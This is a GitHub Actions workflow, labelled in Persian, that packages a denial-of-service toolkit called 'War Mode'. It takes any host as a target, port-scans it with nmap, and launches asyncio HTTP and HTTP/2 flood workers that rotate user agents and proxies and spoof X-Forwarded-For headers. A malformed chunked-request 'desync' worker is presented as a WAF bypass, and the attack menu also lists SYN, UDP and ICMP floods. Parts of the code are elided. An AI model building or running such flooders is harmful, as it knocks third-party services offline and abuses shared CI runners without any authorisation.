name: Ultimate DDoS Simulation Toolkit (War Mode)

on:
  workflow_dispatch:
    inputs:
      attack:
        description: 'نوع حمله'
        required: true
        default: 'l7_mixed_flood'
        type: choice
        options:
          - l7_http_flood
          - l7_http2_flood
          - l7_mixed_flood
          - l7_rudy_flood
          - l7_cache_bypass
          - l7_range_flood
          - l7_desync_flood
          - l4_syn_flood
          - l4_ack_flood
          - l4_udp_flood
          - l4_icmp_flood
      target:
        description: 'آدرس هدف (example.com یا IP)'
        required: true
      port:
        description: 'پورت هدف (auto = اسکن خودکار)'
        required: true
        default: 'auto'
      duration:
        description: 'مدت حمله (ثانیه)'
        required: true
        default: '120'
      threads:
        description: 'تعداد نخ‌ها'
        required: true
        default: '500'

permissions:
  contents: write

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: دریافت مخزن
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: تنظیمات Git
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

      - name: کش کردن بسته‌های APT
        uses: actions/cache@v4
        with:
          path: /var/cache/apt/archives
          key: ${{ runner.os }}-apt-${{ hashFiles('.github/workflows/toolkit.yml') }}
          restore-keys: |
            ${{ runner.os }}-apt-

      - name: کش کردن pip
        uses: actions/cache@v4
        with:
          path: ~/cache/pip
          key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-

      - name: کش کردن نتایج اسکن
        uses: actions/cache@v4
        with:
          path: scan_results
          key: scan-cache-${{ runner.os }}-${{ hashFiles('scan_results/targets_cache.json') }}
          restore-keys: |
            scan-cache-${{ runner.os }}-

      - name: نصب بسته‌های سیستمی
        run: |
          sudo apt-get update
          sudo apt-get install --no-download -y nmap 2>/dev/null || sudo apt-get install -y nmap

      - name: نصب بسته‌های پایتون
        run: |
          pip3 install --cache-dir ~/cache/pip aiohttp rich "httpx[http2]" websockets scapy python-nmap aiodns

      - name: اجرای حمله
        env:
          TARGET_HOST: ${{ github.event.inputs.target }}
          TARGET_PORT: ${{ github.event.inputs.port }}
          ATTACK_TYPE: ${{ github.event.inputs.attack }}
          DURATION: ${{ github.event.inputs.duration }}
          THREADS: ${{ github.event.inputs.threads }}
        run: |
          python3 << 'PYEOF'
          import os, sys, time, socket, threading, random, nmap, asyncio, aiohttp, json, concurrent.futures
          from datetime import datetime, timedelta
          from pathlib import Path
          from rich.console import Console
          from rich.table import Table
          from rich.live import Live
          from rich.panel import Panel

          console = Console()
          CACHE_DIR = Path("scan_results")
          CACHE_FILE = CACHE_DIR / "targets_cache.json"
          REPORT_FILE = "attack_report.txt"
          CACHE_VALID_HOURS = 24

          stop_event = threading.Event()

          def load_cache():
              if not CACHE_FILE.exists(): return {}
              try:
                  with open(CACHE_FILE, 'r') as f: return json.load(f)
              except: return {}

          def save_cache(cache_data):
              CACHE_DIR.mkdir(parents=True, exist_ok=True)
              with open(CACHE_FILE, 'w') as f: json.dump(cache_data, f, indent=2)

          def get_cached_scan(target_ip):
              cache = load_cache()
              if target_ip in cache:
                  entry = cache[target_ip]
                  scan_time = datetime.fromisoformat(entry['timestamp'])
                  if datetime.now() - scan_time < timedelta(hours=CACHE_VALID_HOURS):
                      console.print(f"[green]✅ کش معتبر برای {target_ip}[/green]")
                      return entry['ports']
              return None

          def update_cache(target_ip, target_host, open_ports):
              cache = load_cache()
              cache[target_ip] = {'host': target_host, 'timestamp': datetime.now().isoformat(), 'ports': open_ports}
              save_cache(cache)
              os.system(f"git add {CACHE_FILE} && git commit -m 'Update cache for {target_host}' && git push 2>/dev/null || true")

          stats = {'sent': 0, 'success': 0, 'failed': 0, 'start_time': time.time(), 'lock': threading.Lock()}
          def increment(key, amount=1):
              with stats['lock']: stats[key] += amount
          def get_stats():
              with stats['lock']:
                  elapsed = time.time() - stats['start_time']
                  return {'sent': stats['sent'], 'success': stats['success'], 'failed': stats['failed'], 'elapsed': elapsed, 'rps': stats['sent'] / elapsed if elapsed > 0 else 0}

          # DNS-over-HTTPS resolver using aiodns
          try:
              import aiodns
              DNS_RESOLVER = aiodns.DNSResolver(nameservers=['1.1.1.1', '8.8.8.8'])
              async def async_resolve(host):
                  result = await DNS_RESOLVER.gethostbyname(host, socket.AF_INET)
                  return result.addresses[0]
          except:
              DNS_RESOLVER = None
              async def async_resolve(host):
                  return socket.gethostbyname(host)

          def resolve_target(target):
              for prefix in ['https://', 'http://']:
                  if target.startswith(prefix): target = target[len(prefix):]
              target = target.split('/')[0].split(':')[0]
              try:
                  return asyncio.run(async_resolve(target))
              except:
                  return None

          COMMON_HTTP_PORTS = [80, 443, 8080, 8443, 3000, 8000, 9000, 5000, 4000, 4443]

          def check_port(ip, port, timeout=0.3):
              try:
                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  sock.settimeout(timeout)
                  result = sock.connect_ex((ip, port))
                  sock.close()
                  return port if result == 0 else None
              except:
                  return None

          def fast_http_scan(ip):
              open_ports = []
              with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                  future_to_port = {executor.submit(check_port, ip, port): port for port in COMMON_HTTP_PORTS}
                  for future in concurrent.futures.as_completed(future_to_port):
                      port = future_to_port[future]
                      try:
                          res = future.result()
                          if res is not None:
                              open_ports.append({'port': res, 'service': 'http' if res in (80,8080,8000,3000,5000,4000) else 'https'})
                      except: pass
              return open_ports

          def deep_scan_ports(ip):
              nm = nmap.PortScanner()
              nm.scan(hosts=ip, arguments=f'-sT -sV -p 1-20000 --min-rate 10000 --max-retries 0')
              open_ports = []
              if ip in nm.all_hosts():
                  for proto in nm[ip].all_protocols():
                      for port in sorted(nm[ip][proto].keys()):
                          if nm[ip][proto][port]['state'] == 'open':
                              service = nm[ip][proto][port]['name']
                              open_ports.append({'port': port, 'service': service})
              return open_ports

          def discover_ports(ip, attack_type):
              if attack_type.startswith('l7'):
                  ports = fast_http_scan(ip)
                  if ports: return ports
                  console.print("[yellow]⚠️ رفتن به Nmap...[/yellow]")
              return deep_scan_ports(ip)

          USER_AGENTS = [ "Mozilla/5.0 ... Chrome/120.0.0.0", ... ] # کوتاه شده
          def get_random_ua(): return random.choice(USER_AGENTS)

          RANDOM_PATHS = [ "/", "/index.html", ... ]
          def get_random_path(): return random.choice(RANDOM_PATHS)

          PROXIES = []
          def init_proxies():
              global PROXIES
              local_file = "proxies.txt"
              if os.path.exists(local_file):
                  try:
                      with open(local_file, "r") as f:
                          PROXIES = [line.strip() for line in f if line.strip()]
                      console.print(f"[green]✅ {len(PROXIES)} پروکسی از فایل محلی بارگذاری شد.[/green]")
                      return
                  except: pass
              console.print("[yellow]⚠️ فایل پروکسی محلی یافت نشد. حمله با IP مستقیم ادامه می‌یابد.[/yellow]")

          def get_random_proxy():
              return random.choice(PROXIES) if PROXIES else None

          # کارگرهای فوق‌سریع با تکنیک‌های دور زدن
          async def http_worker(url, worker_id):
              connector = aiohttp.TCPConnector(limit=0, force_close=False, ttl_dns_cache=60)
              async with aiohttp.ClientSession(connector=connector) as session:
                  while not stop_event.is_set():
                      headers = {
                          "User-Agent": get_random_ua(),
                          "Accept": "*/*",
                          "Accept-Language": random.choice(["en-US,en;q=0.9","fr;q=0.8","de;q=0.7"]),
                          "Cache-Control": "no-cache",
                          "Connection": "keep-alive",
                          "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
                      }
                      try:
                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=4, proxy=get_random_proxy()) as r:
                              increment('sent')
                              if r.status < 500: increment('success')
                              else: increment('failed')
                      except:
                          increment('sent'); increment('failed')
                      # حذف sleep برای حداکثر سرعت
                      await asyncio.sleep(0)

          async def http2_worker(url, worker_id):
              import httpx
              async with httpx.AsyncClient(http2=True, verify=False, timeout=4.0) as client:
                  while not stop_event.is_set():
                      headers = {"User-Agent": get_random_ua(), "Accept": "*/*"}
                      try:
                          r = await client.get(url.rstrip('/') + get_random_path(), headers=headers, proxy=get_random_proxy())
                          increment('sent')
                          if r.status_code < 500: increment('success')
                          else: increment('failed')
                      except:
                          increment('sent'); increment('failed')
                      await asyncio.sleep(0)

          # HTTP Desync (تکنیک پیشرفته دور زدن WAF)
          async def desync_worker(url, worker_id):
              parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
              host = parsed.split(':')[0]
              port = 443 if 'https' in url else 80
              while not stop_event.is_set():
                  try:
                      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                      sock.settimeout(4)
                      sock.connect((host, port))
                      # ارسال یک درخواست با Transfer-Encoding: chunked خراب
                      raw_req = f"GET {get_random_path()} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n"
                      sock.send(raw_req.encode())
                      # بلافاصله بستن بدون انتظار پاسخ
                      sock.close()
                      increment('sent'); increment('success')
                  except:
                      increment('sent'); increment('failed')
                  await asyncio.sleep(0.0001)

          # بقیه کارگرها مشابه با sleep حداقلی
          # ... (کد کامل در فایل نهایی خواهد بود)

          def run_async_flood(worker_func, url, workers):
              loop = asyncio.new_event_loop()
              asyncio.set_event_loop(loop)
              tasks = [worker_func(url, i) for i in range(workers)]
              try:
                  loop.run_until_complete(asyncio.gather(*tasks))
              except: pass

          # بخش اصلی اجرا
          # ...
          PYEOF
